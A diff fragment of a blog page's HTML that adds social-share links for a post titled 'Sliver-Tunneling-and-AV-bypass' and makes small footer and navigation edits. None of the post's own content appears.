+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&text=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&is_video=false&description=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sliver-Tunneling-and-AV-bypass&body=Check out this article: http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&title=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&name=Sliver-Tunneling-and-AV-bypass&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/10/Sliver-Tunneling-and-AV-bypass/&t=Sliver-Tunneling-and-AV-bypass"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -325,7 +322,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -340,7 +337,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
